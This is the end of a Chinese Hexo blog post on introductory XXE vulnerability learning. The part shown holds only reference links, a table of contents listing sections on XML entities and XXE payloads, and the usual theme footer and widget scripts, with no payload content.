+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358023.png" alt="image-20211026143509182"></p>
+<p><strong>PS：该文章只记录了 XXE 的入门学习，深入学习请圆详读下面参考文章</strong></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">Web安全学习之XXE漏洞利用</a></p>
+<p><a target="_blank" rel="noopener" href="https://ctfbook.ph0en1x.com/web/zhu-ru/xmlshi-ti-zhu-ru#ji-chu-zhi-shi">XML实体注入</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1657188">如何在PHP中解析XML</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Seizer</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://seizer-zyx.github.io/post/2021-10/XXE%E6%BC%8F%E6%B4%9E/">https://seizer-zyx.github.io/post/2021-10/XXE%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://seizer-zyx.github.io" target="_blank">Seizer</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></div><div class="post_share"><div class="social-share" data-image="https://gitee.com/seizer-zyx/picgo/raw/master/cover-images/202112062110436.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/2021-11/HECTF2021/"><img class="prev-cover" src="https://raw.githubusercontent.com/seizer-zyx/picgo/master/202108292144427.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HECTF 2021</div></div></a></div><div class="next-post pull-right"><a href="/post/2021-10/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E8%A5%BF%E5%AE%89%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/"><img class="next-cover" src="https://gitee.com/seizer-zyx/picgo/raw/master/cover-images/202112062132932.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">第二届西安邮电大学网络安全技能大赛</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/" title="LAMP和LNMP环境搭建的艰辛历程"><img class="cover" src="https://raw.githubusercontent.com/seizer-zyx/picgo/master/202108292144431.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-10</div><div class="title">LAMP和LNMP环境搭建的艰辛历程</div></div></a></div><div><a href="/post/2021-09/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/" title="ctfd靶场搭建过程"><img class="cover" src="https://gitee.com/seizer-zyx/picgo/raw/master/cover-images/202112062124522.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-15</div><div class="title">ctfd靶场搭建过程</div></div></a></div><div><a href="/post/2021-10/Flask%E6%A1%86%E6%9E%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="Flask框架及其漏洞学习"><img class="cover" src="https://gitee.com/seizer-zyx/picgo/raw/master/cover-images/202112062123578.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-13</div><div class="title">Flask框架及其漏洞学习</div></div></a></div><div><a href="/post/2021-10/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Phar反序列化漏洞"><img class="cover" src="https://gitee.com/seizer-zyx/picgo/raw/master/cover-images/202112062110437.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-13</div><div class="title">Phar反序列化漏洞</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">XXE漏洞的学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XML%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">XML基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BD%93"><span class="toc-number">1.2.</span> <span class="toc-text">实体</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E6%A1%A3%E7%B1%BB%E5%9E%8B%E5%AE%9A%E4%B9%89%EF%BC%9A-DTD"><span class="toc-number">1.3.</span> <span class="toc-text">文档类型定义： DTD</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E9%83%A8%E5%BC%95%E7%94%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text">内部引用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E5%BC%95%E7%94%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">外部引用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">XML 注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">XXE漏洞的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%9C%AC%E5%9C%B0%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%EF%BC%88Normal-XXE%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">有回显读本地敏感文件（Normal XXE）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%EF%BC%88Blind-XXE%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">无回显读取本地敏感文件（Blind XXE）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload1"><span class="toc-number">2.2.1.</span> <span class="toc-text">Payload1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload2"><span class="toc-number">2.2.2.</span> <span class="toc-text">Payload2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%80%83"><span class="toc-number">2.3.</span> <span class="toc-text">思考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUU-XXE-COURSE-1"><span class="toc-number">3.</span> <span class="toc-text">BUU XXE COURSE 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Seizer</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start -->
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.16/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://python-gitee-calendar-api.vercel.app/api?seizer-zyx";
+            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
+            var git_user ="seizer-zyx";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/'){
+                console.log('已挂载github calendar')
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style>undefined</style><script data-pjax>
+  function butterfly_clock_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.jsdelivr.net/gh/tzy13755126023/BLOG_SOURCE/theme_f/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_injector_config();
+  }
+  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.js"></script><!-- hexo injector body_end end --></body></html>
